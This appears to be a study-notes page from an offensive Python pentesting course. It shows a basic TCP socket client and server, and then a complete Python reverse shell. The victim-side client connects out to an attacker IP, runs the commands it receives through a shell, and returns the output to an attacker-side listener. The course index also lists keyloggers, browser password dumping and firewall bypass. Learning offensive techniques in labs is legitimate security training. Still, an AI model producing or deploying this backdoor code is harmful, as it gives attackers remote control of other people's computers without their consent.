---
title: Coding a TCP connection and d reverse shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Coding a TCP connection and a reverse shell

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).





## Basic connection 

From eJPT study module + the book Networking computers.

### Client side

To be run on victim's computer.
```python
from socket import *
serverName = "servername or ip"
serverPort = 12000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))

sentence = str(input("Enter a sentence in lower case: "))
clientSocket.send(sentence.encode())
modifiedSentence = clientSocket.recv(1024)

print("From server: ", modifiedSentence.decode())
clientSocket.close()
```

### Server  side

```python
from socket import *

serverPort = 12000
serverSocket = socket(AF_INET, SOCK_STREAM)

serverSocket.bind(('', serverPort))
serverSocket.listen(1)
print("Server is ready to receive...")

while True:
	connectionSocket, addr = serverSocket.accept()
	sentence = connectionSocket.recv(1024).decode()
	capitalizedsentence = sentence.upper()
	connectionSocket.send(capitalizedsentence.encode())
	connectionSocket.close()
```


## Reverse TCP connection 

From the course: Python For Offensive PenTest: A Complete Practical  

### Client side

To be run on victim's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket    # For Building TCP Connection
import subprocess # To start the shell in the system

def connect():
    s = socket.socket()
    s.connect(('10.0.2.6', 1234)) # Here we define the Attacker IP and the listening port

    while True:
        command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket

        if 'terminate' in command.decode(): # if we got terminate order from the attacker, close the socket and break the loop
            s.close()
            break
        else:   # otherwise, we pass the received command to a shell process

            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read()) # send back the result
            s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error

def main():
    connect()
main()
        
```

### Server side

To be run on attacker's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket

def connect():

    s = socket.socket()
    s.bind(("10.0.2.15", 1234))
    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single
    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode())
            conn.close()
            break
        elif '' in command: # If the user just click enter, we will send a whoami command
            conn.send('whoami'.encode()) 
            print( conn.recv(1024).decode()) 
        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(1024).decode()) # print the result that we got back

def main():
    connect()
main()

```


## Using pyinstaller

See [pyinstaller](../pyinstaller.md).